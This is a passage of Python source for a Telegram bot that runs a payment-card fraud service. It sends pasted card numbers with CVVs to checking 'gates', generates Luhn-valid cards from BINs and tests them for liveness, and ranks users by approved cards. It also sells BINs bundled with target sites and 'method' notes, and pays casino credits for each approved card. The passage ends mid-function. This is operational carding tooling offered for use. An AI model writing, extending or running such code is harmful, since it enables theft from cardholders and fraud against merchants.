                chain_label, explorer_addr_url, chain_supports_asset,
                asset_compatible_chains,
            )
            from keep_alive import _wallet_txn, _debit_balance, _log_wallet_tx
        except Exception as e:
            await q.answer(f"Module error: {e}", show_alert=True)
            return
        if not chain_supports_asset(picked_chain, asset):
            compat = asset_compatible_chains(asset)
            try:
                await q.edit_message_text(
                    f"❌ {asset} cannot be withdrawn on {chain_label(picked_chain)}.\n"
                    f"Compatible: {', '.join(compat) if compat else '(none)'}")
            except Exception:
                pass
            return
        try:
            wid = None
            with _wallet_txn() as conn:
                if not _debit_balance(q.from_user.id, asset, amount, conn=conn):
                    try:
                        await q.edit_message_text(f"❌ Insufficient {asset} balance")
                    except Exception:
                        pass
                    return
                wid = _log_wallet_tx(
                    conn=conn, telegram_id=q.from_user.id, tx_type='withdraw',
                    chain=picked_chain, asset=asset, amount=amount,
                    address=address, status='pending',
                )
        except Exception as e:
            try:
                await q.edit_message_text(f"❌ Withdrawal failed: {e}")
            except Exception:
                pass
            return
        short = f"{address[:10]}…{address[-6:]}" if len(address) > 22 else address
        addr_url = explorer_addr_url(picked_chain, address)
        kb = None
        if addr_url:
            from telegram import InlineKeyboardButton, InlineKeyboardMarkup
            kb = InlineKeyboardMarkup([[
                InlineKeyboardButton("🔍 View Address on Explorer", url=addr_url)
            ]])
        try:
            await q.edit_message_text(
                f"⏳ <b>Withdrawal Queued #{wid}</b>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"💎 {amount} {asset}\n"
                f"🔗 {chain_label(picked_chain)}\n"
                f"📤 To: <code>{short}</code>\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"⌛ Broadcasting on the next worker tick (≤45s).",
                parse_mode=ParseMode.HTML, reply_markup=kb)
        except Exception:
            pass


# ════════════════════════════════════════════════════════════════════════════
# RATE LIMITER — per-user single-check cooldown (anti-spam)
# ════════════════════════════════════════════════════════════════════════════
import time as _rl_time

_RATE_COOLDOWNS: dict = {}  # {user_id: last_check_timestamp}
_RATE_LIMITS = {"owner": 0, "premium": 2, "free": 5}  # seconds


def _check_rate_limit(user_id: int) -> float:
    """Returns 0 if OK, else remaining cooldown seconds."""
    if is_owner(user_id):
        return 0
    limit = _RATE_LIMITS["premium"] if is_premium(user_id) else _RATE_LIMITS["free"]
    last = _RATE_COOLDOWNS.get(user_id, 0)
    elapsed = _rl_time.monotonic() - last
    if elapsed < limit:
        return round(limit - elapsed, 1)
    return 0


def _update_rate_limit(user_id: int):
    _RATE_COOLDOWNS[user_id] = _rl_time.monotonic()


# ════════════════════════════════════════════════════════════════════════════
# CHECK HISTORY  /history
# ════════════════════════════════════════════════════════════════════════════

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/history [USER_ID] — show last 20 card checks."""
    user = update.effective_user

    # Admin can look up other users
    target_id = user.id
    if context.args and is_owner(user.id):
        try:
            target_id = int(context.args[0])
        except ValueError:
            await update.message.reply_text(ae("❌ Invalid user ID."))
            return

    loop = asyncio.get_running_loop()

    def _fetch():
        from modules.database import _execute_with_retry
        return _execute_with_retry(
            """SELECT card_bin, result, gate, response, created_at
               FROM card_logs
               WHERE user_id = %s
               ORDER BY created_at DESC LIMIT 20""",
            (target_id,), fetch=True
        ) or []

    rows = await loop.run_in_executor(None, _fetch)

    if not rows:
        await update.message.reply_text(
            ae("📜 <b>Check History</b>\n\nNo checks found yet. Start checking cards to build your history!"),
            parse_mode=ParseMode.HTML)
        return

    lines = [ae(f"📜 <b>Check History</b>  (last {len(rows)} checks)\n")]
    for r in rows:
        res_icon = "✅" if str(r.get("result", "")).upper() in ("APPROVED", "LIVE", "CHARGED") else "❌"
        gate_lbl  = (r.get("gate") or "?").upper()
        bin_lbl   = r.get("card_bin") or "??????"
        ts        = r.get("created_at")
        date_lbl  = ts.strftime("%m/%d %H:%M") if ts else "N/A"
        resp_snippet = (r.get("response") or "")[:40]
        lines.append(f"{res_icon} <code>{bin_lbl}xxxxxx</code>  [{gate_lbl}]  <i>{resp_snippet}</i>  <code>{date_lbl}</code>")

    text = "\n".join(lines)
    gif_url = get_sexy_anime_gif("welcome")
    if gif_url:
        try:
            await update.message.reply_animation(
                animation=gif_url, caption=text,
                parse_mode=ParseMode.HTML)
            return
        except Exception:
            pass
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ════════════════════════════════════════════════════════════════════════════
# GATE LEADERBOARD  /top
# ════════════════════════════════════════════════════════════════════════════

async def leaderboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/top — weekly leaderboard of most approved cards."""
    loop = asyncio.get_running_loop()

    def _fetch():
        from modules.database import _execute_with_retry
        return _execute_with_retry("""
            SELECT u.user_id, u.username,
                   COUNT(*) FILTER (WHERE cl.result ILIKE '%approved%' OR cl.result ILIKE '%live%' OR cl.result ILIKE '%charged%') AS approved_count,
                   MODE() WITHIN GROUP (ORDER BY cl.gate) AS fav_gate
            FROM card_logs cl
            JOIN users u ON u.user_id = cl.user_id
            WHERE cl.created_at >= NOW() - INTERVAL '7 days'
            GROUP BY u.user_id, u.username
            ORDER BY approved_count DESC
            LIMIT 10
        """, fetch=True) or []

    rows = await loop.run_in_executor(None, _fetch)

    medals = ["🥇", "🥈", "🥉"] + ["🏅"] * 7
    sep = "━━━━━━━━━━━━━━━━━━━━━━━━"
    lines = [ae(f"🏆 <b>ONICHAN LEADERBOARD</b>\n<i>Top checkers this week</i>\n{sep}")]

    if not rows:
        lines.append("No checks recorded this week yet.\nStart checking to climb the rankings!")
    else:
        for i, r in enumerate(rows):
            uname   = r.get("username") or "Anonymous"
            safe_u  = ("@" + uname[:14]) if uname and uname != "Anonymous" else "Anonymous"
            count   = int(r.get("approved_count") or 0)
            gate    = (r.get("fav_gate") or "?").upper()
            lines.append(f"{medals[i]} <b>#{i+1}</b>  {safe_u}  — <b>{count}</b> approved  [{gate}]")

    lines.append(sep)
    lines.append("💡 Top 3 earn bonus premium days every Sunday!")

    text = "\n".join(lines)
    gif_url = get_sexy_anime_gif("welcome")
    if gif_url:
        try:
            await update.message.reply_animation(
                animation=gif_url, caption=text,
                parse_mode=ParseMode.HTML)
            return
        except Exception:
            pass
    await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ════════════════════════════════════════════════════════════════════════════
# LIVE CARD PASTE DETECTION — detect raw card in any DM message
# ════════════════════════════════════════════════════════════════════════════

import re as _re
_CARD_PATTERN = _re.compile(
    r'\b(\d{15,16})[|/\s:](\d{1,2})[|/\s:](\d{2,4})[|/\s:](\d{3,4})\b'
)


async def live_card_paste_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Detects raw card in any DM text and prompts gate selection."""
    if not update.message or not update.message.text:
        return
    if update.message.chat.type != "private":
        return
    if update.message.text.startswith("/"):
        return
    # Don't interfere with active mass checks
    user = update.effective_user
    if context.user_data.get(f"mass_check_running_{user.id}"):
        return

    txt = update.message.text.strip()
    match = _CARD_PATTERN.search(txt)
    if not match:
        return

    cc, mm, yy, cvv = match.groups()
    masked = f"{cc[:6]}{'*' * (len(cc)-10)}{cc[-4:]}"

    # Store card for gate selection callback
    context.user_data["paste_card"] = f"{cc}|{mm}|{yy}|{cvv}"

    keyboard = InlineKeyboardMarkup([
        [_btn("⚡ ST5", callback_data="paste_gate:st5"),
         _btn("🎯 ST12", callback_data="paste_gate:st12"),
         _btn("💎 B3N", callback_data="paste_gate:b3n")],
        [_btn("🔥 STR", callback_data="paste_gate:str"),
         _btn("🏦 AST", callback_data="paste_gate:ast"),
         _btn("💳 RPP", callback_data="paste_gate:st1")],
        [_btn("❌ Cancel", style="default", callback_data="paste_gate:cancel")],
    ])
    gif_url = get_sexy_anime_gif("welcome")
    prompt = ae(
        f"💳 <b>Card Detected!</b>\n\n"
        f"<code>{masked}|{mm}|{yy}|{cvv}</code>\n\n"
        f"Select a gate to check it on:"
    )
    if gif_url:
        try:
            await update.message.reply_animation(
                animation=gif_url, caption=prompt,
                parse_mode=ParseMode.HTML, reply_markup=keyboard)
            return
        except Exception:
            pass
    await update.message.reply_text(prompt, parse_mode=ParseMode.HTML, reply_markup=keyboard)


async def paste_gate_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle gate selection after live card paste detection."""
    query = update.callback_query
    await query.answer()
    user = query.from_user

    action = query.data.split(":", 1)[1]
    if action == "cancel":
        try:
            await query.message.delete()
        except Exception:
            pass
        return

    card_str = context.user_data.pop("paste_card", None)
    if not card_str:
        await query.message.reply_text(ae("❌ Card data expired. Please paste again."))
        return

    gate_map = {
        "st5": "/st5", "st12": "/st12", "b3n": "/b3n",
        "str": "/str", "ast": "/ast", "st1": "/st1",
    }
    cmd = gate_map.get(action)
    if not cmd:
        return

    try:
        await query.message.delete()
    except Exception:
        pass

    # Simulate sending the gate command
    from telegram import Message
    fake_args = card_str.split("|")
    context.args = fake_args

    gate_handler_map = {
        "st5": gate_st5, "st12": gate_st12, "b3n": gate_b3n,
        "str": gate_str, "ast": gate_ast, "st1": gate_st1,
    }
    handler = gate_handler_map.get(action)
    if handler:
        await handler(update, context)
    else:
        await query.message.reply_text(ae(f"❌ Gate {action.upper()} not available."))


# ════════════════════════════════════════════════════════════════════════════
# MASS BIN CHECKER  /bincheck
# ════════════════════════════════════════════════════════════════════════════

async def bincheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/bincheck GATE — check a list of BINs for liveness. Premium only."""
    user = update.effective_user
    if not is_approved(user.id):
        await update.message.reply_text(ae("❌ Access denied."))
        return
    if not is_premium(user.id):
        await update.message.reply_text(
            ae("💎 <b>PREMIUM REQUIRED</b>\n\nMass BIN checking requires premium.\n/premium to upgrade."),
            parse_mode=ParseMode.HTML)
        return

    gate = context.args[0].lower() if context.args else "st5"
    context.user_data["bincheck_gate"] = gate
    context.user_data["awaiting_bincheck"] = True

    await update.message.reply_text(
        ae(f"📋 <b>Mass BIN Checker</b>\n\n"
           f"Gate: <b>{gate.upper()}</b>\n\n"
           f"Now send me a list of BINs (one per line, max 20):\n"
           f"<code>411111\n424242\n512345</code>"),
        parse_mode=ParseMode.HTML)


async def _process_bincheck(update: Update, context: ContextTypes.DEFAULT_TYPE, bins_text: str):
    """Process mass BIN check."""
    from modules.gate_checker import get_bin_info
    from modules.cc_generator import generate_cards_for_bin

    user = update.effective_user
    gate = context.user_data.pop("bincheck_gate", "st5")
    bins = [b.strip() for b in bins_text.strip().splitlines() if b.strip().isdigit() and len(b.strip()) >= 6][:20]

    if not bins:
        await update.message.reply_text(ae("❌ No valid BINs found. Send 6-digit BINs one per line."))
        return

    status_msg = await update.message.reply_text(
        ae(f"🔍 Checking {len(bins)} BINs on {gate.upper()}... Please wait."),
        parse_mode=ParseMode.HTML)

    results = []
    gate_handler_map = {
        "st5": gate_st5, "st12": gate_st12, "b3n": gate_b3n,
        "str": gate_str, "ast": gate_ast,
    }

    for bin_num in bins:
        try:
            # Get BIN info
            loop = asyncio.get_running_loop()
            bin_info = await loop.run_in_executor(None, get_bin_info, bin_num)
            country = bin_info.get("country", "?") if bin_info else "?"
            brand   = bin_info.get("brand", "?") if bin_info else "?"

            # Generate 3 test cards using Luhn
            try:
                from modules.cc_generator import generate_cards
                test_cards = generate_cards(bin_num, count=3)
            except Exception:
                # Fallback: simple Luhn completion
                test_cards = [f"{bin_num}{'0' * (16 - len(bin_num))}|12|27|123"]

            approved_count = 0
            for card in test_cards[:2]:
                parts = card.split("|")
                if len(parts) < 4:
                    continue
                try:
                    from modules.gate_checker import check_generic_gate
                    result = await loop.run_in_executor(
                        None, check_generic_gate, gate, *parts[:4])
                    if result and result.get("status", "").upper() in ("APPROVED", "LIVE", "CHARGED"):
                        approved_count += 1
                except Exception:
                    pass
                await asyncio.sleep(1)

            if approved_count >= 1:
                status = "✅ LIVE"
            else:
                status = "❌ DEAD"
            results.append(f"{status}  <code>{bin_num}</code>  {brand} · {country}")
        except Exception as e:
            results.append(f"⚠️ ERROR  <code>{bin_num}</code>  {str(e)[:30]}")
        await asyncio.sleep(0.5)

    live_count = sum(1 for r in results if "LIVE" in r)
    sep = "━━━━━━━━━━━━━━━━━━━━"
    text = ae(
        f"📊 <b>BIN Check Results</b>  [{gate.upper()}]\n{sep}\n"
        + "\n".join(results)
        + f"\n{sep}\n✅ Live: {live_count}  |  ❌ Dead: {len(results) - live_count}"
    )
    try:
        await status_msg.edit_text(text, parse_mode=ParseMode.HTML)
    except Exception:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)


# ════════════════════════════════════════════════════════════════════════════
# BIN SHOP BOT COMMANDS  /binshop  /addbin  /removebin
# ════════════════════════════════════════════════════════════════════════════

async def binshop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/binshop — browse available BINs for purchase."""
    user = update.effective_user
    if not is_approved(user.id):
        await update.message.reply_text(ae("❌ Access denied."))
        return

    loop = asyncio.get_running_loop()
    try:
        from modules.bin_shop import get_bin_listings, get_purchased_bin_ids
        result = await loop.run_in_executor(None, get_bin_listings, 1, 10)
        purchased = await loop.run_in_executor(None, get_purchased_bin_ids, user.id)
    except Exception as e:
        await update.message.reply_text(ae(f"❌ BIN Shop unavailable: {str(e)[:80]}"))
        return

    listings = result.get("listings", [])
    total    = result.get("total", 0)

    if not listings:
        await update.message.reply_text(
            ae("🛒 <b>BIN Shop</b>\n\nNo BINs available right now. Check back later!"),
            parse_mode=ParseMode.HTML)
        return

    sep = "━━━━━━━━━━━━━━━━━━━━━━"
    lines = [ae(f"🛒 <b>BIN SHOP</b>  ({total} listings)\n{sep}")]
    keyboard_rows = []

    for lst in listings:
        lid      = lst["id"]
        country  = lst.get("country", "Unknown")
        ctype    = lst.get("card_type", "").upper()
        price    = float(lst.get("price", 0))
        sites    = lst.get("site_count", 0)
        desc     = (lst.get("public_description") or "")[:40]
        owned    = "✅ OWNED" if lid in purchased else f"💰 ${price:.2f}"

        lines.append(
            f"<b>#{lid}</b>  {country}  {ctype}\n"
            f"  📡 {sites} site(s)  |  {owned}\n"
            f"  <i>{desc}</i>"
        )
        if lid not in purchased:
            keyboard_rows.append([_btn(f"Buy #{lid} — ${price:.2f}", callback_data=f"binbuy:{lid}")])

    keyboard_rows.append([_btn("🔄 Refresh", style="default", callback_data="binshop_refresh")])
    text = "\n".join(lines)

    gif_url = get_sexy_anime_gif("welcome")
    if gif_url:
        try:
            await update.message.reply_animation(
                animation=gif_url, caption=text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard_rows))
            return
        except Exception:
            pass
    await update.message.reply_text(text, parse_mode=ParseMode.HTML,
                                     reply_markup=InlineKeyboardMarkup(keyboard_rows))


async def binbuy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle BIN purchase button."""
    query = update.callback_query
    await query.answer()
    user = query.from_user

    listing_id = int(query.data.split(":", 1)[1])
    loop = asyncio.get_running_loop()

    try:
        from modules.bin_shop import buy_bin
        # buy_bin raises ValueError on failure, returns listing dict on success
        listing = await loop.run_in_executor(None, buy_bin, user.id, listing_id)
    except ValueError as e:
        await query.message.reply_text(ae(f"❌ {str(e)[:120]}"))
        return
    except Exception as e:
        await query.message.reply_text(ae(f"❌ Purchase failed: {str(e)[:80]}"))
        return

    # listing is a plain dict with decrypted fields
    bin_num = listing.get("bin_number", "??????")
    brand   = listing.get("brand", "?")
    level   = listing.get("card_level", "?")
    bank    = listing.get("bank", "?")
    country = listing.get("country", "?")
    sites   = listing.get("sites", []) or []
    note    = listing.get("method_note", "")
    price   = float(listing.get("price_paid", 0))

    site_lines = "\n".join(
        f"  🔗 <b>{s.get('name', '?')}</b> — {s.get('url', '?')}"
        for s in sites
    ) or "  No sites listed."

    text = ae(
        f"✅ <b>BIN PURCHASED!</b>\n\n"
        f"💳 <b>BIN:</b> <code>{bin_num}</code>\n"
        f"🏦 <b>Bank:</b> {bank}\n"
        f"🌍 <b>Country:</b> {country}\n"
        f"💎 <b>Brand:</b> {brand} {level}\n"
        f"💰 <b>Paid:</b> ${price:.2f}\n\n"
        f"📡 <b>Sites:</b>\n{site_lines}\n\n"
        + (f"📝 <b>Method:</b>\n<i>{note}</i>" if note else "")
    )
    await query.message.reply_text(text, parse_mode=ParseMode.HTML)


async def addbin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/addbin BIN PRICE DESCRIPTION — admin adds a BIN to shop."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    if len(context.args) < 3:
        await update.message.reply_text(
            "📋 <b>Add BIN to Shop</b>\n\n"
            "<b>Usage:</b> <code>/addbin BIN PRICE DESCRIPTION</code>\n\n"
            "<b>Then send a follow-up message with:</b>\n"
            "Line 1: Brand (VISA/MC/AMEX)\n"
            "Line 2: Country (United States)\n"
            "Line 3: Country code (US)\n"
            "Line 4: Card type (CREDIT/DEBIT)\n"
            "Line 5: Level (CLASSIC/GOLD/PLATINUM)\n"
            "Line 6: Bank name\n"
            "Line 7+: Site URLs (one per line)\n\n"
            "<b>Example:</b>\n"
            "<code>/addbin 411111 9.99 Chase US Visa Gold — great for digital goods</code>",
            parse_mode=ParseMode.HTML)
        return

    bin_num = context.args[0]
    price   = context.args[1]
    desc    = " ".join(context.args[2:])

    try:
        float(price)
    except ValueError:
        await update.message.reply_text(ae("❌ Price must be a number!"))
        return

    context.user_data["addbin_pending"] = {"bin": bin_num, "price": price, "desc": desc}
    context.user_data["awaiting_addbin_details"] = True

    await update.message.reply_text(
        f"✅ BIN <code>{bin_num}</code> queued at ${price}.\n\n"
        "Now send the details in this format:\n"
        "<code>VISA\nUnited States\nUS\nCREDIT\nGOLD\nChase Bank\nhttps://example.com</code>",
        parse_mode=ParseMode.HTML)


async def removebin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/removebin ID — admin removes a BIN listing."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return
    if not context.args:
        await update.message.reply_text(ae("❌ Usage: /removebin LISTING_ID"))
        return
    try:
        lid = int(context.args[0])
    except ValueError:
        await update.message.reply_text(ae("❌ Invalid ID."))
        return

    loop = asyncio.get_running_loop()
    try:
        from modules.bin_shop import remove_bin_listing
        await loop.run_in_executor(None, remove_bin_listing, lid)
        await update.message.reply_text(ae(f"✅ BIN listing #{lid} removed."))
    except Exception as e:
        await update.message.reply_text(ae(f"❌ Error: {str(e)[:80]}"))


# ════════════════════════════════════════════════════════════════════════════
# CASINO MODULE  /casino
# ════════════════════════════════════════════════════════════════════════════

async def casino_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/casino — open the casino games menu."""
    user = update.effective_user
    if not is_approved(user.id):
        await update.message.reply_text(ae("❌ Access denied."))
        return

    try:
        from modules.credits import get_balance
        loop = asyncio.get_running_loop()
        balance = await loop.run_in_executor(None, get_balance, user.id)
    except Exception:
        balance = 0

    sep = "━━━━━━━━━━━━━━━━━━━━━━"
    text = ae(
        f"🎰 <b>ONICHAN CASINO</b>\n{sep}\n"
        f"💰 Your credits: <b>{balance}</b>\n{sep}\n\n"
        f"🪙 Head & Tail    ✊ Rock Paper Scissors\n"
        f"🎲 Dice Rolling   🎡 Spin Wheel\n"
        f"🃏 Blackjack      🎱 Number Pool\n"
        f"💣 Mines          🚀 Crash\n{sep}\n"
        f"<i>Min bet: 10 credits | Max bet: 500 credits</i>\n"
        f"Earn credits by checking cards or /credits to top up."
    )
    keyboard = InlineKeyboardMarkup([
        [_btn("🪙 Flip Coin", callback_data="casino:head_tail"),
         _btn("🎲 Dice", callback_data="casino:dice_rolling")],
        [_btn("🃏 Blackjack", callback_data="casino:blackjack"),
         _btn("🚀 Crash", callback_data="casino:crash")],
        [_btn("🎡 Spin Wheel", callback_data="casino:spin_wheel"),
         _btn("💣 Mines", callback_data="casino:mines")],
        [_btn("📊 My Stats", callback_data="casino:stats"),
         _btn("💰 Balance", callback_data="casino:balance")],
    ])

    gif_url = get_sexy_anime_gif("welcome")
    if gif_url:
        try:
            await update.message.reply_animation(
                animation=gif_url, caption=text,
                parse_mode=ParseMode.HTML, reply_markup=keyboard)
            return
        except Exception:
            pass
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=keyboard)


async def casino_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle casino game selection callbacks."""
    query = update.callback_query
    await query.answer()
    user = query.from_user
    action = query.data.split(":", 1)[1]

    if action == "balance":
        try:
            from modules.credits import get_balance
            loop = asyncio.get_running_loop()
            balance = await loop.run_in_executor(None, get_balance, user.id)
        except Exception:
            balance = 0
        await query.message.reply_text(
            ae(f"💰 <b>Your Casino Balance</b>\n\n{balance} credits\n\n"
               f"Earn credits:\n• +1 per declined check\n• +10 per approved card"),
            parse_mode=ParseMode.HTML)
        return

    if action == "stats":
        loop = asyncio.get_running_loop()
        def _fetch_stats():
            from modules.database import _execute_with_retry
            return _execute_with_retry(
                """SELECT COUNT(*) as total_bets,
                          SUM(CASE WHEN outcome='win' THEN 1 ELSE 0 END) as wins,
                          SUM(CASE WHEN outcome='loss' THEN 1 ELSE 0 END) as losses,
                          SUM(payout - bet_amount) as net_profit
                   FROM casino_bets WHERE user_id = %s""",
                (user.id,), fetch_one=True)
        row = await loop.run_in_executor(None, _fetch_stats)
        if not row or not row.get("total_bets"):
            await query.message.reply_text(ae("🎲 No casino bets yet! Use /casino to play."))
            return
        net = float(row.get("net_profit") or 0)
        profit_str = f"+{net:.0f}" if net >= 0 else f"{net:.0f}"
        await query.message.reply_text(
            ae(f"📊 <b>Your Casino Stats</b>\n\n"
               f"🎯 Total bets: {row['total_bets']}\n"
               f"✅ Wins: {row.get('wins', 0)}\n"
               f"❌ Losses: {row.get('losses', 0)}\n"
               f"💰 Net: {profit_str} credits"),
            parse_mode=ParseMode.HTML)
        return

    # Generic game handler
    game_names = {
        "head_tail": "Head & Tail 🪙",
        "dice_rolling": "Dice Rolling 🎲",
        "blackjack": "Blackjack 🃏",
        "crash": "Crash 🚀",
        "spin_wheel": "Spin Wheel 🎡",
        "mines": "Mines 💣",
    }
    game_name = game_names.get(action, action.replace("_", " ").title())

    try:
        from modules.credits import get_balance
        loop = asyncio.get_running_loop()
        balance = await loop.run_in_executor(None, get_balance, user.id)
    except Exception:
        balance = 0

    if balance < 10:
        await query.message.reply_text(
            ae(f"❌ Not enough credits to play {game_name}!\n\n"
               f"Minimum bet: 10 credits\nYour balance: {balance} credits\n\n"
               f"Earn credits by checking cards."),
            parse_mode=ParseMode.HTML)
        return

    # Show bet selection
    bet_kb = InlineKeyboardMarkup([
        [_btn("10 credits", callback_data=f"casinobet:{action}:10"),
         _btn("25 credits", callback_data=f"casinobet:{action}:25")],
        [_btn("50 credits", callback_data=f"casinobet:{action}:50"),
         _btn("100 credits", callback_data=f"casinobet:{action}:100")],
        [_btn("❌ Cancel", style="default", callback_data="casino:balance")],
    ])
    await query.message.reply_text(
        ae(f"🎮 <b>{game_name}</b>\n\nBalance: {balance} credits\nChoose your bet:"),
        parse_mode=ParseMode.HTML, reply_markup=bet_kb)


async def casinobet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle casino bet placement."""
    import random as _rand
    query = update.callback_query
    await query.answer()
    user = query.from_user

    _, game, bet_str = query.data.split(":", 2)
    bet = int(bet_str)

    try:
        from modules.credits import get_balance, deduct_credits, add_credits
        loop = asyncio.get_running_loop()
        balance = await loop.run_in_executor(None, get_balance, user.id)

        if balance < bet:
            await query.message.reply_text(ae(f"❌ Insufficient credits! You have {balance}, need {bet}."))
            return

        # Deduct bet
        await loop.run_in_executor(None, deduct_credits, user.id, bet, "casino_bet", f"Casino: {game}")

        # Simple outcome (house edge ~5%)
        win = _rand.random() < 0.47
        payout = int(bet * 1.9) if win else 0

        if win:
            await loop.run_in_executor(None, add_credits, user.id, payout, "casino_win", f"Casino win: {game}")

        # Log bet
        try:
            from modules.database import _execute_with_retry
            _execute_with_retry("""
                INSERT INTO casino_bets (user_id, game, bet_amount, outcome, payout, created_at)
                VALUES (%s, %s, %s, %s, %s, NOW())
            """, (user.id, game, bet, "win" if win else "loss", payout))
        except Exception:
            pass

        new_balance = await loop.run_in_executor(None, get_balance, user.id)

        if win:
            result_text = ae(
                f"🎉 <b>YOU WIN!</b>\n\n"
                f"🎮 Game: {game.replace('_', ' ').title()}\n"
                f"💰 Bet: {bet} credits\n"
                f"🏆 Payout: +{payout} credits\n"
                f"💼 New balance: {new_balance} credits"
            )
            gif_type = "success"
        else:
            result_text = ae(
                f"😔 <b>YOU LOSE</b>\n\n"
                f"🎮 Game: {game.replace('_', ' ').title()}\n"
                f"💸 Lost: {bet} credits\n"
                f"💼 New balance: {new_balance} credits\n\n"
                f"Better luck next time!"
            )
            gif_type = "failed"

        gif_url = get_sexy_anime_gif(gif_type)
        if gif_url:
            try:
                await query.message.reply_animation(
                    animation=gif_url, caption=result_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup([[
                        _btn("🎮 Play Again", callback_data=f"casino:{game}"),
                        _btn("🎰 Main Menu", callback_data="casino_main")
                    ]]))
                return
            except Exception:
                pass
        await query.message.reply_text(result_text, parse_mode=ParseMode.HTML)

    except Exception as e:
        await query.message.reply_text(ae(f"❌ Casino error: {str(e)[:80]}"))


# ════════════════════════════════════════════════════════════════════════════
# PAYMENT RECEIPT SYSTEM — auto-send receipt on any premium activation
# ════════════════════════════════════════════════════════════════════════════

async def send_premium_receipt(bot, user_id: int, username: str, plan_name: str,
                                payment_method: str, amount_str: str,
                                duration_days: int, expiry_date: str):
    """DM a formatted receipt to the user after premium activation."""
    import uuid
    order_id = f"ONC-{user_id % 10000:04d}-{uuid.uuid4().hex[:6].upper()}"
    text = ae(
        f"🧾 <b>ONICHAN PREMIUM RECEIPT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>Order ID:</b> <code>{order_id}</code>\n"
        f"📅 <b>Date:</b> {__import__('datetime').datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}\n"
        f"📦 <b>Plan:</b> {plan_name}\n"
        f"💳 <b>Payment:</b> {payment_method}\n"
        f"💰 <b>Amount:</b> {amount_str}\n"
        f"👤 <b>User:</b> @{username} (<code>{user_id}</code>)\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Activated:</b> Immediately\n"
        f"📅 <b>Expires:</b> {expiry_date}\n"
        f"⏰ <b>Duration:</b> {duration_days} days\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎉 Thank you for supporting Onichan!\n"
        f"Use /help to see all premium commands."
    )
    try:
        await bot.send_message(chat_id=user_id, text=text, parse_mode="HTML")
    except Exception as e:
        print(f"[Receipt] Could not send receipt to {user_id}: {e}")


# ════════════════════════════════════════════════════════════════════════════
# RICH BROADCAST SYSTEM  /broadcast
# (extends the existing one — keeps backward compat, adds html/photo/preview/segment)
# ════════════════════════════════════════════════════════════════════════════

async def rich_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/broadcast — rich broadcast with flags: html, photo, preview, segment."""
    user = update.effective_user
    if not is_owner(user.id):
        await update.message.reply_text(ae("❌ Owner only!"))
        return

    if not context.args:
        await update.message.reply_text(
            "📢 <b>Rich Broadcast</b>\n\n"
            "<b>Modes:</b>\n"
            "• <code>/broadcast TEXT</code> — plain text (HTML supported)\n"
            "• <code>/broadcast preview TEXT</code> — send to yourself first\n"
            "• <code>/broadcast segment premium TEXT</code> — only premium users\n"
            "• <code>/broadcast segment free TEXT</code> — only free users\n"
            "• <code>/broadcast photo URL CAPTION</code> — photo + caption\n\n"
            "<b>Example:</b>\n"
            "<code>/broadcast 🔥 &lt;b&gt;New gate live!&lt;/b&gt;</code>",
            parse_mode=ParseMode.HTML)
        return

    args = context.args
    mode = args[0].lower()

    # Preview mode
    if mode == "preview":
        message_text = " ".join(args[1:])
        try:
            await context.bot.send_message(
                chat_id=user.id, text=message_text, parse_mode=ParseMode.HTML)
            keyboard = InlineKeyboardMarkup([[
                _btn("✅ Send to All", callback_data=f"bcast_confirm:all:{message_text[:100]}"),
                _btn("❌ Cancel", style="default", callback_data="bcast_cancel")
            ]])
            await update.message.reply_text(
                ae("👁 Preview sent to you. Confirm broadcast?"),
                reply_markup=keyboard)
        except Exception as e:
            await update.message.reply_text(ae(f"❌ Preview failed: {str(e)[:80]}"))
        return

    # Photo mode
    if mode == "photo" and len(args) >= 2:
        photo_url = args[1]
        caption   = " ".join(args[2:]) if len(args) > 2 else ""
        segment   = "all"
        await _do_broadcast(update, context, None, photo_url, caption, segment)
        return

    # Segment mode
    if mode == "segment" and len(args) >= 3:
        segment      = args[1].lower()  # premium / free
        message_text = " ".join(args[2:])
        await _do_broadcast(update, context, message_text, None, None, segment)
        return

    # Default — all users, HTML supported
    message_text = " ".join(args)
    await _do_broadcast(update, context, message_text, None, None, "all")


async def _do_broadcast(update, context, text, photo_url, caption, segment):
    """Internal: execute the broadcast loop.
    get_approved_users_sync / get_premium_users_sync both return plain lists of int user_ids.
    """
    from modules.database import get_approved_users_sync, get_premium_users_sync

    status_msg = await update.message.reply_text(ae(f"📢 Broadcasting to [{segment}]..."))

    loop = asyncio.get_running_loop()
    if segment == "premium":
        user_ids = await loop.run_in_executor(None, get_premium_users_sync)
    elif segment == "free":
        all_ids  = await loop.run_in_executor(None, get_approved_users_sync)
        prem_ids = set(await loop.run_in_executor(None, get_premium_users_sync))
        user_ids = [uid for uid in (all_ids or []) if uid not in prem_ids]
    else:
        user_ids = await loop.run_in_executor(None, get_approved_users_sync)
    user_ids = user_ids or []

    success = 0
    failed  = 0

    for uid in user_ids:
        try:
            if photo_url:
                await context.bot.send_photo(
